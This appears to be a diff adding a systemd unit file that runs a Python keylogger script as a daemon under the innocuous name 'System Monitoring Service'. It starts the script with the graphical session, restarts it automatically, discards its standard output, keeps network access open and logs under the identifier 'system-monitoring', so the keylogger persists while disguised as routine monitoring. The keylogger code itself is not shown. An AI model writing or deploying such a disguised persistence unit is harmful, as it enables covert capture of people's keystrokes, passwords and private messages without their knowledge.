@@ -1,0 +1,40 @@
+[Unit]
+Description=System Monitoring Service
+After=graphical-session.target
+Wants=graphical-session.target
+
+[Service]
+Type=forking
+User=%i
+Group=%i
+ExecStart=/usr/bin/python3 /home/%i/keylogger/keylogger.py --daemon
+Environment=KEYLOGGER_PASSWORD=your_password_here
+Environment=DISPLAY=:0
+Environment=XDG_RUNTIME_DIR=/run/user/1000
+
+# Auto-restart configuration
+Restart=always
+RestartSec=60
+StartLimitInterval=300
+StartLimitBurst=5
+
+# Process management
+KillMode=mixed
+KillSignal=SIGTERM
+TimeoutStopSec=30
+
+# Security and resource limits
+PrivateNetwork=false
+ProtectSystem=strict
+ProtectHome=false
+NoNewPrivileges=true
+MemoryMax=100M
+TasksMax=50
+
+# Logging
+StandardOutput=null
+StandardError=journal
+SyslogIdentifier=system-monitoring
+
+[Install]
+WantedBy=default.target
